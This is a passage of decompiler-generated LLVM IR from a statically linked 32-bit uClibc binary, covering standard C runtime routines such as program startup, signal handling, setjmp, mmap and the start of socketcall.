  %tmp55 = ptrtoint i32* %arg3 to i32
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v2_8053956 = mul i32 %arg2, 4
  store i32 %v2_8053956, i32* %edx.global-to-local, align 4
  store i32 %tmp55, i32* %ecx.global-to-local, align 4
  store i32 %arg7, i32* @global_var_80582e4.330, align 4
  store i32 %arg6, i32* @global_var_80582f4.327, align 4
  %v2_8053971 = add i32 %v2_8053956, 4
  %v3_8053971 = add i32 %v2_8053971, %tmp55
  store i32 %arg4, i32* @ebp, align 4
  store i32 %v3_8053971, i32* @global_var_80582e8.331, align 8
  %v3_8053981 = load i32, i32* %arg3, align 4
  %v14_8053981 = icmp eq i32 %v3_8053971, %v3_8053981
  %v1_8053983 = icmp eq i1 %v14_8053981, false
  br i1 %v1_8053983, label %dec_label_pc_805398e, label %dec_label_pc_8053985

dec_label_pc_8053985:                             ; preds = %entry
  %v2_8053987 = add i32 %tmp55, %v2_8053956
  store i32 %v2_8053987, i32* @global_var_80582e8.331, align 8
  br label %dec_label_pc_805398e

dec_label_pc_805398e:                             ; preds = %entry, %dec_label_pc_8053985
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_8053995 = ptrtoint i32* %stack_var_-180 to i32
  %tmp69 = bitcast i32* %stack_var_-180 to i8*
  store i32 %v2_8053995, i32* @edi, align 4
  %v5_8053999 = call i8* @_memset(i8* %tmp69, i32 0, i32 30)
  %v6_8053999 = ptrtoint i8* %v5_8053999 to i32
  store i32 %v6_8053999, i32* %ecx.global-to-local, align 4
  %v0_805399b = load i32, i32* @global_var_80582e8.331, align 8
  %v1_80539a528 = inttoptr i32 %v0_805399b to i32*
  %v2_80539a529 = load i32, i32* %v1_80539a528, align 4
  %v3_80539a530 = icmp eq i32 %v2_80539a529, 0
  %v1_80539a832 = icmp eq i1 %v3_80539a530, false
  %v1_80539a234 = add i32 %v0_805399b, 4
  br i1 %v1_80539a832, label %dec_label_pc_80539a2, label %dec_label_pc_80539aa

dec_label_pc_80539a2:                             ; preds = %dec_label_pc_805398e, %dec_label_pc_80539a2
  %v1_80539a236 = phi i32 [ %v1_80539a2, %dec_label_pc_80539a2 ], [ %v1_80539a234, %dec_label_pc_805398e ]
  %v1_80539a5 = inttoptr i32 %v1_80539a236 to i32*
  %v2_80539a5 = load i32, i32* %v1_80539a5, align 4
  %v3_80539a5 = icmp eq i32 %v2_80539a5, 0
  %v1_80539a8 = icmp eq i1 %v3_80539a5, false
  %v1_80539a2 = add i32 %v1_80539a236, 4
  br i1 %v1_80539a8, label %dec_label_pc_80539a2, label %dec_label_pc_80539a5.dec_label_pc_80539aa_crit_edge

dec_label_pc_80539a5.dec_label_pc_80539aa_crit_edge: ; preds = %dec_label_pc_80539a2
  br label %dec_label_pc_80539aa

dec_label_pc_80539aa:                             ; preds = %dec_label_pc_80539a5.dec_label_pc_80539aa_crit_edge, %dec_label_pc_805398e
  %v1_80539a2.lcssa = phi i32 [ %v1_80539a2, %dec_label_pc_80539a5.dec_label_pc_80539aa_crit_edge ], [ %v1_80539a234, %dec_label_pc_805398e ]
  store i32 %v1_80539a2.lcssa, i32* %ecx.global-to-local, align 4
  store i32 %v2_8053995, i32* %edx.global-to-local, align 4
  %v1_80539c423 = inttoptr i32 %v1_80539a2.lcssa to i32*
  %v2_80539c424 = load i32, i32* %v1_80539c423, align 4
  %v3_80539c425 = icmp eq i32 %v2_80539c424, 0
  %v1_80539c727 = icmp eq i1 %v3_80539c425, false
  br i1 %v1_80539c727, label %dec_label_pc_80539b3.lr.ph, label %dec_label_pc_80539c9

dec_label_pc_80539b3.lr.ph:                       ; preds = %dec_label_pc_80539aa
  %v7_80539bf = load i1, i1* @df, align 1
  %v8_80539bf = select i1 %v7_80539bf, i32 -4, i32 4
  br label %dec_label_pc_80539b3

dec_label_pc_80539b3:                             ; preds = %dec_label_pc_80539b3.lr.ph, %dec_label_pc_80539c1
  %v1_80539ba = phi i32 [ %v2_80539c424, %dec_label_pc_80539b3.lr.ph ], [ %v2_80539c4, %dec_label_pc_80539c1 ]
  %v0_80539bd = phi i32 [ %v1_80539a2.lcssa, %dec_label_pc_80539b3.lr.ph ], [ %v1_80539c1, %dec_label_pc_80539c1 ]
  %v6_80539b8 = icmp ugt i32 %v1_80539ba, 14
  br i1 %v6_80539b8, label %dec_label_pc_80539c1, label %dec_label_pc_80539ba

dec_label_pc_80539ba:                             ; preds = %dec_label_pc_80539b3
  %v1_80539b3 = inttoptr i32 %v0_80539bd to i32*
  %v0_80539ba = load i32, i32* %edx.global-to-local, align 4
  %v2_80539ba = mul i32 %v1_80539ba, 8
  %v3_80539ba = add i32 %v0_80539ba, %v2_80539ba
  store i32 %v3_80539ba, i32* %edi.global-to-local, align 4
  store i32 %v0_80539bd, i32* %esi.global-to-local, align 4
  %v2_80539bf = load i32, i32* %v1_80539b3, align 4
  %v4_80539bf = inttoptr i32 %v3_80539ba to i32*
  store i32 %v2_80539bf, i32* %v4_80539bf, align 4
  %v5_80539bf = load i32, i32* %edi.global-to-local, align 4
  %v6_80539bf = load i32, i32* %esi.global-to-local, align 4
  %v9_80539bf = add i32 %v5_80539bf, %v8_80539bf
  %v10_80539bf = add i32 %v6_80539bf, %v8_80539bf
  store i32 %v9_80539bf, i32* %edi.global-to-local, align 4
  store i32 %v10_80539bf, i32* %esi.global-to-local, align 4
  %v1_80539c0 = inttoptr i32 %v10_80539bf to i32*
  %v2_80539c0 = load i32, i32* %v1_80539c0, align 4
  %v4_80539c0 = inttoptr i32 %v9_80539bf to i32*
  store i32 %v2_80539c0, i32* %v4_80539c0, align 4
  %v5_80539c0 = load i32, i32* %edi.global-to-local, align 4
  %v6_80539c0 = load i32, i32* %esi.global-to-local, align 4
  %v9_80539c0 = add i32 %v5_80539c0, %v8_80539bf
  %v10_80539c0 = add i32 %v6_80539c0, %v8_80539bf
  store i32 %v9_80539c0, i32* @edi, align 4
  store i32 %v10_80539c0, i32* @esi, align 4
  %v0_80539c1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80539c1

dec_label_pc_80539c1:                             ; preds = %dec_label_pc_80539b3, %dec_label_pc_80539ba
  %v0_80539c1 = phi i32 [ %v0_80539bd, %dec_label_pc_80539b3 ], [ %v0_80539c1.pre, %dec_label_pc_80539ba ]
  %v1_80539c1 = add i32 %v0_80539c1, 8
  store i32 %v1_80539c1, i32* %ecx.global-to-local, align 4
  %v1_80539c4 = inttoptr i32 %v1_80539c1 to i32*
  %v2_80539c4 = load i32, i32* %v1_80539c4, align 4
  %v3_80539c4 = icmp eq i32 %v2_80539c4, 0
  %v1_80539c7 = icmp eq i1 %v3_80539c4, false
  br i1 %v1_80539c7, label %dec_label_pc_80539b3, label %dec_label_pc_80539c4.dec_label_pc_80539c9_crit_edge

dec_label_pc_80539c4.dec_label_pc_80539c9_crit_edge: ; preds = %dec_label_pc_80539c1
  br label %dec_label_pc_80539c9

dec_label_pc_80539c9:                             ; preds = %dec_label_pc_80539c4.dec_label_pc_80539c9_crit_edge, %dec_label_pc_80539aa
  store i32 %v2_8053995, i32* @eax, align 4
  %v0_80539cd = call i32 @_dl_aux_init()
  store i32 %v0_80539cd, i32* @eax, align 4
  %v0_80539d2 = call i32 @__GI___uClibc_init()
  %v1_80539db = icmp eq i32 %tmp51, 0
  %v1_80539dd = icmp eq i1 %v1_80539db, false
  br i1 %v1_80539dd, label %dec_label_pc_80539e3, label %dec_label_pc_80539df

dec_label_pc_80539df:                             ; preds = %dec_label_pc_80539c9
  %v1_80539df = and i32 %tmp51, -65536
  %v2_80539df = or i32 %v1_80539df, 4096
  br label %dec_label_pc_80539e3

dec_label_pc_80539e3:                             ; preds = %dec_label_pc_80539c9, %dec_label_pc_80539df
  %v0_80539e3 = phi i32 [ %tmp51, %dec_label_pc_80539c9 ], [ %v2_80539df, %dec_label_pc_80539df ]
  store i32 %v0_80539e3, i32* @global_var_80582ec.329, align 4
  %v13_80539e8 = icmp eq i32 %tmp50, -1
  %v1_80539ed = icmp eq i1 %v13_80539e8, false
  br i1 %v1_80539ed, label %dec_label_pc_8053a18, label %dec_label_pc_80539ef

dec_label_pc_80539ef:                             ; preds = %dec_label_pc_80539e3
  %v0_80539ef = call i32 @getuid()
  store i32 %v0_80539ef, i32* @ebx, align 4
  %v0_80539f6 = call i32 @geteuid()
  %v0_80539fb = load i32, i32* @ebx, align 4
  %v12_80539fb = icmp eq i32 %v0_80539fb, %v0_80539f6
  %v1_80539fd = icmp eq i1 %v12_80539fb, false
  br i1 %v1_80539fd, label %dec_label_pc_8053a28, label %dec_label_pc_80539ff

dec_label_pc_80539ff:                             ; preds = %dec_label_pc_80539ef
  %v0_80539ff = call i32 @getgid()
  store i32 %v0_80539ff, i32* @ebx, align 4
  %v0_8053a06 = call i32 @getegid()
  %v0_8053a0b = load i32, i32* @ebx, align 4
  %v12_8053a0b = icmp eq i32 %v0_8053a0b, %v0_8053a06
  %v1_8053a0d = icmp eq i1 %v12_8053a0b, false
  br i1 %v1_8053a0d, label %dec_label_pc_8053a28, label %dec_label_pc_8053a0f.thread

dec_label_pc_8053a0f.thread:                      ; preds = %dec_label_pc_80539ff
  br label %dec_label_pc_8053a52

dec_label_pc_8053a18:                             ; preds = %dec_label_pc_80539e3
  %v15_8053a18 = icmp eq i32 %tmp50, %tmp49
  %v1_8053a1c = icmp eq i1 %v15_8053a18, false
  br i1 %v1_8053a1c, label %dec_label_pc_8053a28, label %dec_label_pc_8053a1e

dec_label_pc_8053a1e:                             ; preds = %dec_label_pc_8053a18
  %v15_8053a22 = icmp eq i32 %tmp48, %tmp47
  br i1 %v15_8053a22, label %dec_label_pc_8053a52, label %dec_label_pc_8053a28

dec_label_pc_8053a28:                             ; preds = %dec_label_pc_8053a1e, %dec_label_pc_8053a18, %dec_label_pc_80539ff, %dec_label_pc_80539ef
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8053a2f = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8053a3e = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8053a4d = call i32 @__check_one_fd()
  br label %dec_label_pc_8053a52

dec_label_pc_8053a52:                             ; preds = %dec_label_pc_8053a0f.thread, %dec_label_pc_8053a1e, %dec_label_pc_8053a28
  store i32 %tmp55, i32* %edx.global-to-local, align 4
  %v2_8053a59 = load i32, i32* %arg3, align 4
  store i32 %v2_8053a59, i32* inttoptr (i32 134577136 to i32*), align 16
  %v2_8053a60 = load i32, i32* %arg3, align 4
  store i32 %v2_8053a60, i32* %ebx.global-to-local, align 4
  %v1_8053a62 = icmp eq i32 %v2_8053a60, 0
  br i1 %v1_8053a62, label %dec_label_pc_8053a52.dec_label_pc_8053a8e_crit_edge, label %dec_label_pc_8053a66

dec_label_pc_8053a52.dec_label_pc_8053a8e_crit_edge: ; preds = %dec_label_pc_8053a52
  br label %dec_label_pc_8053a8e

dec_label_pc_8053a66:                             ; preds = %dec_label_pc_8053a52
  store i32 47, i32* %stack_var_-188, align 4
  store i32 %v2_8053a60, i32* inttoptr (i32 134577144 to i32*), align 8
  %v0_8053a6e = load i32, i32* %edx.global-to-local, align 4
  %v1_8053a6e = inttoptr i32 %v0_8053a6e to i32*
  %v2_8053a6e = load i32, i32* %v1_8053a6e, align 4
  %v2_8053a70 = inttoptr i32 %v2_8053a6e to i8*
  %v3_8053a70 = call i32 @strrchr(i8* %v2_8053a70, i32 47)
  store i32 %v2_8053a6e, i32* %esi.global-to-local, align 4
  %v2_8053a7b = load i32, i32* %stack_var_-188, align 4
  store i32 %v2_8053a7b, i32* @edi, align 4
  %v1_8053a80 = add i32 %v3_8053a70, 1
  store i32 %v1_8053a80, i32* bitcast (i32** @global_var_8057bf4.332 to i32*), align 4
  br label %dec_label_pc_8053a8e

dec_label_pc_8053a8e:                             ; preds = %dec_label_pc_8053a52.dec_label_pc_8053a8e_crit_edge, %dec_label_pc_8053a66
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32* %esi.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80582f0.326, align 16
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32 0), label %dec_label_pc_8053aac, label %dec_label_pc_8053adc.critedge

dec_label_pc_8053aac:                             ; preds = %dec_label_pc_8053a8e, %dec_label_pc_8053aac
  %v4_8053aac = phi i32 [ %v1_8053ab3, %dec_label_pc_8053aac ], [ 0, %dec_label_pc_8053a8e ]
  store i32 ptrtoint (i32* @global_var_8053ab3.333 to i32), i32* %stack_var_-188, align 4
  %v5_8053aac = mul i32 %v4_8053aac, 4
  %v6_8053aac = add i32 %v5_8053aac, ptrtoint (i32* @global_var_8057b6c.324 to i32)
  %v7_8053aac = inttoptr i32 %v6_8053aac to i32*
  %v8_8053aac = load i32, i32* %v7_8053aac, align 4
  call void @__pseudo_call(i32 %v8_8053aac)
  %v0_8053ab3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ab3 = add i32 %v0_8053ab3, 1
  store i32 %v1_8053ab3, i32* %ebx.global-to-local, align 4
  %v1_8053ab4 = load i32, i32* %esi.global-to-local, align 4
  %v7_8053ab4 = icmp ult i32 %v1_8053ab3, %v1_8053ab4
  br i1 %v7_8053ab4, label %dec_label_pc_8053aac, label %dec_label_pc_8053ab8

dec_label_pc_8053ab8:                             ; preds = %dec_label_pc_8053aac
  store i32 134560446, i32* %stack_var_-188, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32* @esi, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32 0), label %dec_label_pc_8053ad0, label %dec_label_pc_8053adc

dec_label_pc_8053ad0:                             ; preds = %dec_label_pc_8053ab8, %dec_label_pc_8053ad0
  %v4_8053ad0 = phi i32 [ %v1_8053ad7, %dec_label_pc_8053ad0 ], [ 0, %dec_label_pc_8053ab8 ]
  store i32 ptrtoint (i32* @global_var_8053ad7.334 to i32), i32* %stack_var_-188, align 4
  %v5_8053ad0 = mul i32 %v4_8053ad0, 4
  %v6_8053ad0 = add i32 %v5_8053ad0, ptrtoint (i32* @global_var_8057b6c.324 to i32)
  %v7_8053ad0 = inttoptr i32 %v6_8053ad0 to i32*
  %v8_8053ad0 = load i32, i32* %v7_8053ad0, align 4
  call void @__pseudo_call(i32 %v8_8053ad0)
  %v0_8053ad7 = load i32, i32* @ebx, align 4
  %v1_8053ad7 = add i32 %v0_8053ad7, 1
  store i32 %v1_8053ad7, i32* @ebx, align 4
  %v1_8053ad8 = load i32, i32* @esi, align 4
  %v7_8053ad8 = icmp ult i32 %v1_8053ad7, %v1_8053ad8
  br i1 %v7_8053ad8, label %dec_label_pc_8053ad0, label %dec_label_pc_8053adc

dec_label_pc_8053adc.critedge:                    ; preds = %dec_label_pc_8053a8e
  store i32 134560446, i32* %stack_var_-188, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32* @esi, align 4
  br label %dec_label_pc_8053adc

dec_label_pc_8053adc:                             ; preds = %dec_label_pc_8053ad0, %dec_label_pc_8053adc.critedge, %dec_label_pc_8053ab8
  %v0_8053ae5 = load i32, i32* %stack_var_-188, align 4
  %v1_8053ae5 = load i32, i32* %stack_var_-184, align 4
  %v2_8053ae5 = call i32 @__GI___errno_location(i32 %v0_8053ae5, i32 %v1_8053ae5)
  %v1_8053aea = inttoptr i32 %v2_8053ae5 to i32*
  store i32 0, i32* %v1_8053aea, align 4
  %v2_8053b04 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_8053b04, i32* %stack_var_-188, align 4
  %v1_8053b09 = call i32 @_setjmp(i32 %v2_8053b04)
  store i32 %v2_8053b04, i32* %ebx.global-to-local, align 4
  %v1_8053b0f = icmp eq i32 %v1_8053b09, 0
  %v1_8053b11 = icmp eq i1 %v1_8053b0f, false
  br i1 %v1_8053b11, label %dec_label_pc_8053b59, label %dec_label_pc_8053b13

dec_label_pc_8053b13:                             ; preds = %dec_label_pc_8053adc
  store i32 %v2_8053b04, i32* inttoptr (i32 128 to i32*), align 128
  %v0_8053b37 = load i32, i32* @global_var_80582e8.331, align 8
  store i32 %v0_8053b37, i32* %stack_var_-188, align 4
  store i32 134560594, i32* %stack_var_-200, align 4
  call void @__pseudo_call(i32 %arg1)
  store i32 %v2_8053b04, i32* %edx.global-to-local, align 4
  store i32 %v2_8053b04, i32* %stack_var_-188, align 4
  %v1_8053b7a = call i32 @__GI_exit(i32 %v2_8053b04)
  ret i32 %v1_8053b7a

dec_label_pc_8053b59:                             ; preds = %dec_label_pc_8053adc
  %v0_8053b59 = load i32, i32* %stack_var_-200, align 4
  %v1_8053b59 = call i32 @__libc_errno(i32 %v0_8053b59)
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder i32 %v2_8053b04, { 2, 1, 3, 4, 0, 6, 5 }
  uselistorder i32 %v1_8053ad7, { 1, 2, 0 }
  uselistorder i32 %v1_8053ab3, { 1, 2, 0 }
  uselistorder i32 %v2_80539c4, { 1, 0 }
  uselistorder i32 %v1_80539c1, { 1, 2, 0 }
  uselistorder i32 %v1_80539a234, { 1, 0 }
  uselistorder i32 %v2_8053956, { 2, 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 3, 4, 1, 0, 5, 6, 7, 8, 9 }
  uselistorder i32 %tmp55, { 3, 0, 1, 2 }
  uselistorder i32 (i32)* @__libc_errno, { 1, 6, 5, 0, 3, 4, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI___errno_location, { 0, 7, 6, 5, 4, 1, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), { 1, 2, 3, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), { 1, 4, 2, 5, 3, 0 }
  uselistorder i32* @global_var_8055868.68, { 1, 0 }
  uselistorder i32 47, { 1, 2, 4, 5, 0, 6, 7, 8, 9, 3 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 -65536, { 59, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26, 27, 1, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 2, 3, 48, 49, 51, 52, 55, 4, 5, 53, 54, 56, 57, 58, 6 }
  uselistorder i32 14, { 8, 14, 9, 0, 4, 10, 5, 11, 6, 12, 7, 13, 16, 17, 15, 1, 18, 2, 19, 20, 21, 22, 23, 3 }
  uselistorder i32 30, { 1, 7, 5, 2, 4, 3, 6, 0 }
  uselistorder i32* %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8053adc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053ad0, { 1, 0 }
  uselistorder label %dec_label_pc_8053aac, { 1, 0 }
  uselistorder label %dec_label_pc_8053a8e, { 1, 0 }
  uselistorder label %dec_label_pc_8053a52, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80539e3, { 1, 0 }
  uselistorder label %dec_label_pc_80539c1, { 1, 0 }
  uselistorder label %dec_label_pc_80539b3, { 1, 0 }
  uselistorder label %dec_label_pc_80539a2, { 1, 0 }
  uselistorder label %dec_label_pc_805398e, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8053b86 = load i32, i32* @eax, align 4
  %v1_8053b86 = sub i32 0, %v0_8053b86
  store i32 %v1_8053b86, i32* inttoptr (i32 -8 to i32*), align 8
  ret i32 -1
}

define i32 @__restore_rt(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053b90:
  %v0_8053b95 = load i32, i32* @ebx, align 4
  %v1_8053b95 = inttoptr i32 %v0_8053b95 to %sigcontext*
  %v2_8053b95 = call i32 @sigreturn(%sigcontext* %v1_8053b95)
  %v0_8053b9d = load i32, i32* @ebx, align 4
  %v1_8053b9d = inttoptr i32 %v0_8053b9d to %sigcontext*
  %v2_8053b9d = call i32 @sigreturn(%sigcontext* %v1_8053b9d)
  ret i32 %v2_8053b9d
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg2 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_8053ba0 = load i32, i32* @esi, align 4
  %v1_8053baa = icmp eq i32* %arg2, null
  br i1 %v1_8053baa, label %dec_label_pc_8053bd9, label %dec_label_pc_8053bae

dec_label_pc_8053bae:                             ; preds = %entry
  %v2_8053bae = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8053bae, i32* %edi.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v2_8053bb4 = load i32, i32* %arg2, align 4
  store i32 %v2_8053bb4, i32* %stack_var_-28, align 4
  %v7_8053bb4 = load i1, i1* @df, align 1
  %v8_8053bb4 = select i1 %v7_8053bb4, i32 -4, i32 4
  %v9_8053bb4 = add i32 %v8_8053bb4, %v2_8053bae
  %v10_8053bb4 = add i32 %v8_8053bb4, %tmp6
  store i32 %v9_8053bb4, i32* %edi.global-to-local, align 4
  store i32 %v10_8053bb4, i32* %esi.global-to-local, align 4
  %v1_8053bb5 = inttoptr i32 %v10_8053bb4 to i32*
  %v2_8053bb5 = load i32, i32* %v1_8053bb5, align 4
  %v4_8053bb5 = inttoptr i32 %v9_8053bb4 to i32*
  store i32 %v2_8053bb5, i32* %v4_8053bb5, align 4
  %v5_8053bb5 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053bb5 = load i32, i32* %esi.global-to-local, align 4
  %v9_8053bb5 = add i32 %v5_8053bb5, %v8_8053bb4
  %v10_8053bb5 = add i32 %v6_8053bb5, %v8_8053bb4
  store i32 %v9_8053bb5, i32* %edi.global-to-local, align 4
  store i32 %v10_8053bb5, i32* %esi.global-to-local, align 4
  %v1_8053bb6 = inttoptr i32 %v10_8053bb5 to i32*
  %v2_8053bb6 = load i32, i32* %v1_8053bb6, align 4
  %v4_8053bb6 = inttoptr i32 %v9_8053bb5 to i32*
  store i32 %v2_8053bb6, i32* %v4_8053bb6, align 4
  %v5_8053bb6 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053bb6 = load i32, i32* %esi.global-to-local, align 4
  %v9_8053bb6 = add i32 %v5_8053bb6, %v8_8053bb4
  %v10_8053bb6 = add i32 %v6_8053bb6, %v8_8053bb4
  store i32 %v9_8053bb6, i32* %edi.global-to-local, align 4
  store i32 %v10_8053bb6, i32* %esi.global-to-local, align 4
  %v1_8053bb7 = inttoptr i32 %v10_8053bb6 to i32*
  %v2_8053bb7 = load i32, i32* %v1_8053bb7, align 4
  %v4_8053bb7 = inttoptr i32 %v9_8053bb6 to i32*
  store i32 %v2_8053bb7, i32* %v4_8053bb7, align 4
  %v5_8053bb7 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053bb7 = load i32, i32* %esi.global-to-local, align 4
  %v9_8053bb7 = add i32 %v5_8053bb7, %v8_8053bb4
  %v10_8053bb7 = add i32 %v6_8053bb7, %v8_8053bb4
  store i32 %v9_8053bb7, i32* %edi.global-to-local, align 4
  store i32 %v10_8053bb7, i32* %esi.global-to-local, align 4
  %v1_8053bb8 = inttoptr i32 %v10_8053bb7 to i32*
  %v2_8053bb8 = load i32, i32* %v1_8053bb8, align 4
  %v4_8053bb8 = inttoptr i32 %v9_8053bb7 to i32*
  store i32 %v2_8053bb8, i32* %v4_8053bb8, align 4
  %v5_8053bb8 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053bb8 = load i32, i32* %esi.global-to-local, align 4
  %v9_8053bb8 = add i32 %v5_8053bb8, %v8_8053bb4
  %v10_8053bb8 = add i32 %v6_8053bb8, %v8_8053bb4
  store i32 %v9_8053bb8, i32* %edi.global-to-local, align 4
  store i32 %v10_8053bb8, i32* @esi, align 4
  %v1_8053bc6 = add i32 %tmp6, 4
  %v2_8053bc6 = inttoptr i32 %v1_8053bc6 to i8*
  %v3_8053bc6 = load i8, i8* %v2_8053bc6, align 1
  %v4_8053bc6 = and i8 %v3_8053bc6, 4
  %v5_8053bc6 = icmp eq i8 %v4_8053bc6, 0
  %v1_8053bca = icmp eq i1 %v5_8053bc6, false
  br i1 %v1_8053bca, label %dec_label_pc_8053bd1, label %dec_label_pc_8053bcc

dec_label_pc_8053bcc:                             ; preds = %dec_label_pc_8053bae
  br label %dec_label_pc_8053bd1

dec_label_pc_8053bd1:                             ; preds = %dec_label_pc_8053bae, %dec_label_pc_8053bcc
  %phitmp = bitcast i32* %stack_var_-28 to %sigaction*
  br label %dec_label_pc_8053bd9

dec_label_pc_8053bd9:                             ; preds = %entry, %dec_label_pc_8053bd1
  %v0_8053bdf = phi %sigaction* [ null, %entry ], [ %phitmp, %dec_label_pc_8053bd1 ]
  %v5_8053be4 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8053bdf, i32 %arg3, i32 8)
  store i32 %v0_8053ba0, i32* @esi, align 4
  ret i32 %v5_8053be4

; uselistorder directives
  uselistorder i32 %tmp6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053bd9, { 1, 0 }
  uselistorder label %dec_label_pc_8053bd1, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp1, i32* %edx.global-to-local, align 4
  %v0_8053bf6 = load i32, i32* @ebx, align 4
  %v2_8053bf6 = inttoptr i32 %tmp1 to i32*
  store i32 %v0_8053bf6, i32* %v2_8053bf6, align 4
  %v0_8053bf8 = load i32, i32* @esi, align 4
  %v1_8053bf8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053bf8 = add i32 %v1_8053bf8, 4
  %v3_8053bf8 = inttoptr i32 %v2_8053bf8 to i32*
  store i32 %v0_8053bf8, i32* %v3_8053bf8, align 4
  %v0_8053bfb = load i32, i32* @edi, align 4
  %v1_8053bfb = load i32, i32* %edx.global-to-local, align 4
  %v2_8053bfb = add i32 %v1_8053bfb, 8
  %v3_8053bfb = inttoptr i32 %v2_8053bfb to i32*
  store i32 %v0_8053bfb, i32* %v3_8053bfb, align 4
  %v2_8053bfe = ptrtoint i32* %stack_var_4 to i32
  %v1_8053c02 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053c02 = add i32 %v1_8053c02, 16
  %v3_8053c02 = inttoptr i32 %v2_8053c02 to i32*
  store i32 %v2_8053bfe, i32* %v3_8053c02, align 4
  %v1_8053c08 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053c08 = add i32 %v1_8053c08, 20
  %v3_8053c08 = inttoptr i32 %v2_8053c08 to i32*
  store i32 %arg1, i32* %v3_8053c08, align 4
  %v0_8053c0b = load i32, i32* @ebp, align 4
  %v1_8053c0b = load i32, i32* %edx.global-to-local, align 4
  %v2_8053c0b = add i32 %v1_8053c0b, 12
  %v3_8053c0b = inttoptr i32 %v2_8053c0b to i32*
  store i32 %v0_8053c0b, i32* %v3_8053c0b, align 4
  %v1_8053c0e = load i32, i32* %edx.global-to-local, align 4
  %v2_8053c0e = add i32 %v1_8053c0e, 24
  %v3_8053c0e = inttoptr i32 %v2_8053c0e to i32*
  store i32 0, i32* %v3_8053c0e, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8053c14 = load i32, i32* @ebx, align 4
  %v2_8053c1b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8053c1b, i32* @ebx, align 4
  %v6_8053c1f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8053c14, i32* @ebx, align 4
  %v3_8053c28 = icmp ugt i32 %v6_8053c1f, -4096
  call void @__pseudo_cond_branch(i1 %v3_8053c28, i32 134560640)
  ret i32 %v6_8053c1f

; uselistorder directives
  uselistorder i32 %v6_8053c1f, { 1, 0 }
  uselistorder i32 134560640, { 6, 2, 3, 0, 1, 7, 8, 4, 5 }
  uselistorder i32 -4096, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @ecx, align 4
  %v0_8053c38 = load i32, i32* @ebx, align 4
